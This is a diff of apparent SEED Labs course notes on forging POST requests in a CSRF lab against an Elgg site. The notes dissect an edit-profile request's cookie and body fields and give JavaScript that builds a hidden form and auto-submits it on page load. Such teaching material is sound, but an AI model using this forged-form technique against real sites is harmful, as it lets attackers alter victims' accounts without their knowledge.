@@ -1,90 +1,162 @@
-## Attack on POST Request
+# Attacking POST Services
 
-Because where the data is attached in the POST vs GET, the POST service is slightly more difficult to exploit or create a forge request.
+Unlike GET requests, **POST** requests store their data in the **HTTP request body** instead of the URL. Because the request parameters are not visible in the URL, forging a POST request is slightly more difficult than forging a GET request.
 
-For this lab, we will modify someone's profile. If you go to the person's profile, you can hit the edit profile to modify your own profile. After you edit the profile, the save button that finalizes the edited profile, triggers a POST request.
+In this lab, the objective is to modify another user's profile. Normally, a user edits their own profile through the web interface, and clicking **Save** sends an HTTP POST request to the server.
 
-When we launch the attack, we want to emulate the same profile editing process. The form filling and form submission process.
-If you can do that inside the malicious Web page, this is pretty much the same thing you are doing in your own account.
+A CSRF attack attempts to replicate this same process by automatically filling out and submitting a form from a malicious webpage.
 
-## Edit-Profile POST Request.
+---
 
-We will do an investigation and look at what does the request look like. In this case, we will use the Live HTTP Header extension. What this does is if you send anything from the browser, it will be captured in the HTTP Header Live. That is how you can do an investigation and capture the request and then inspect what's inside.
+# The Edit-Profile POST Request
+
+To successfully forge a POST request, we first need to determine exactly what the legitimate request looks like.
+
+This can be done using browser developer tools or extensions such as **HTTP Header Live**, which capture every HTTP request sent by the browser.
+
+An example request is shown below.
+
+## Request URL
+
+```text
+http://www.seed-server.com/action/profile/edit
+```
+
+Unlike a GET request, notice that **no data appears in the URL**.
+
+---
+
+## HTTP Headers
+
+The browser automatically includes several HTTP headers with the request, such as:
+
+```text
+Host: www.seed-server.com
+User-Agent: Mozilla/5.0 ...
+Accept: text/html,...
+Content-Type: multipart/form-data
+Content-Length: ...
+Origin: http://www.seed-server.com
+Referer: http://www.seed-server.com/profile/charlie/edit
+Cookie: Elgg=<session-id>
+```
+
+The most important header is the **Cookie** header.
+
+The browser automatically attaches the authenticated session cookie, allowing the server to recognize the logged-in user. The attacker does not need to know the session ID because the victim's browser includes it automatically.
+
+---
+
+## POST Data
+
+The actual profile information is stored inside the request body.
+
+A simplified example is shown below:
+
+```text
+__elgg_token=...
+__elgg_ts=...
+name=Charlie
+briefdescription=Samy is my hero!
+accesslevel[briefdescription]=2
+description=...
+guid=58
+```
+
+Some important fields include:
+
+| Parameter | Purpose |
+|-----------|---------|
+| `__elgg_token` | CSRF protection token (disabled during this lab) |
+| `__elgg_ts` | Timestamp used with the CSRF token |
+| `name` | User's display name |
+| `briefdescription` | Profile description |
+| `accesslevel[...]` | Controls who can view the profile field |
+| `guid` | Unique identifier of the target user |
+
+The `guid` parameter is especially important because it identifies which user's profile is being modified.
+
+---
+
+# Sending POST Requests
+
+One of the easiest ways to generate a POST request is through an HTML form.
 
 For example:
 
-http://wmm.seed-server.com/action/profile/edit <--- This is the URL. Clearly there's no data attached.
+```html
+<form action="http://www.example.com/action.php" method="post">
 
---------------------------------
-Host: vmw.seed-server.com 
-User-Agent: Hozilla/S.0 (X11; Ubuntu; Linux x86_64; ... 
-Accept: text/htmLapplication/mhtmlvxml.application/xml; 
-Accept•Language: en•USpen;q1.0.5 
-Accept-Encoding: (pip, deflate 
-Content-Type: nultipart/form-data; 
-Content-Length: 3097 
-Origin: http://morm.seed-server.com 
-Connection: keep-alive 
-Referer: http://www.seed-server.con/profile/charlie/edit 
-Cookie: Ebig=6s7japncnbekdrtp9dhf6linqp <-- This is the session ID that is attached by the browser.
-Upgrade-Insecure-Requests: 1 
----------------------------------
-^ All this is the header ^
+  <label>First Name:</label>
+  <input type="text" name="fname">
 
----------------------------------
-elgg_token=ReCg3N)Xf3Qu22wcOolseQ <--- The first element is the countermeasures.
-&__elgg_ts=1E2gO11111             <--- It is turned off so we can perform the attack.
-&name:Charlie   <-- We are using Charlie's account.
-&descriptionflaccesslevel(description)=2 
-&briefdescription=Samy is my hero!  <-- A certin description field which you can edit.
-&accesslevel[briefdescription]=2    <-- This is access level. In this case, number 2 puts this description field public.
-& (many lines omitted) ... <-- There are other fields you can edit in the profile.
-&guid:58       <-- Victim's ID. You need this so you can target specifically who's profile to edit.
----------------------------------
-^ The important part is the Data ^
+  <label>Last Name:</label>
+  <input type="text" name="lname">
 
-## Sending POST Requests
+  <input type="submit" value="Submit">
 
-How do we launch this request? How do we trigger this request from the victim's machine? 
-There are many different ways to trigger a POST request. But one of the most comon ways is to emualte this form filling and form submission process.
+</form>
+```
 
-In this form:
+When the user submits the form:
 
-<form action="http://www.example.com/action.Php" method="postft> 
-  <label for="fname">First name:</label> 
-  <input type="text"   id="fname" name="fname"><br><br> 
-    
-  <label for="lname">Last name:</label> 
-  <input type="text" id="lname" name="lname"><br><br> 
-  
-  <input type="submit" value="Submit"> 
-</form> 
+1. The browser collects the values entered into the input fields.
+2. It places those values inside the HTTP request body.
+3. A POST request is sent to the URL specified in the `action` attribute.
 
+This is the normal mechanism used by web applications when users submit forms.
 
-First name: ___    <-- What ever you put here will be put inside the data part. That's how the form submission works
-Last name:  ___    <--
+---
 
-Submit 
+# Forging POST Requests
 
-## Forging POST Requests
+A CSRF attack recreates this same form submission process without the victim's knowledge.
 
-In order to emulate this process, we need to dynamically construct a page. We are going to put the form inside our page and we're going to fill in the information dynamically. We will also make the form hidden so the user doesn't see it and we will trigger the submission automatically.
+Instead of displaying a visible form, the attacker:
 
-<script type="text/javascript"> 
-function send_post() 
-{ 
-  var fields; 
-  fields += "<input type='hidden' name='name' value='Bob Smith'>";  <-- Strings
-  fields += "<input type='hidden' name='age' value='20'>";          <--
-  
-  var p = document.createElement("form"); 
-  p.action = "http://www.example.com";  <-- Action set to send this form to the URL
-  p.innerHTML = fields; <-- Puts the string inside the forms as a form of content.
-  p.method = "post"; <-- The type of the form will be post
-  
-  document. body.appendChild(p); <-- You need this to append it to your webpage or else the action will not happen.
-  p.submit(); <-- This will trigger the form of submission that will trigger the post request which will send it to the URL
-} 
-window.onload = function() { send post(); }  <-- After the page loads, this triggers to send the post.
-</script> 
+1. Dynamically creates a hidden HTML form.
+2. Fills the form with the desired values.
+3. Adds the form to the webpage.
+4. Automatically submits the form when the page loads.
 
+A simplified example is shown below:
+
+```javascript
+function send_post() {
+
+    var fields = "";
+    fields += "<input type='hidden' name='name' value='Bob Smith'>";
+    fields += "<input type='hidden' name='age' value='20'>";
+
+    var form = document.createElement("form");
+
+    form.action = "http://www.example.com";
+    form.method = "post";
+    form.innerHTML = fields;
+
+    document.body.appendChild(form);
+
+    form.submit();
+}
+
+window.onload = function () {
+    send_post();
+};
+```
+
+### How It Works
+
+The script performs the following steps:
+
+1. Creates hidden input fields containing the attacker's chosen values.
+2. Dynamatically creates an HTML form.
+3. Sets the form's destination (`action`) to the target website.
+4. Specifies that the form should use the **POST** method.
+5. Appends the form to the webpage.
+6. Automatically submits the form as soon as the page loads.
+
+From the victim's perspective, nothing appears unusual because the form is hidden.
+
+If the victim is already logged into the target website, the browser automatically attaches the authenticated session cookie when submitting the POST request.
+
+As a result, the target server processes the request as though it were submitted directly by the victim, allowing the attacker to modify the victim's profile without their knowledge.
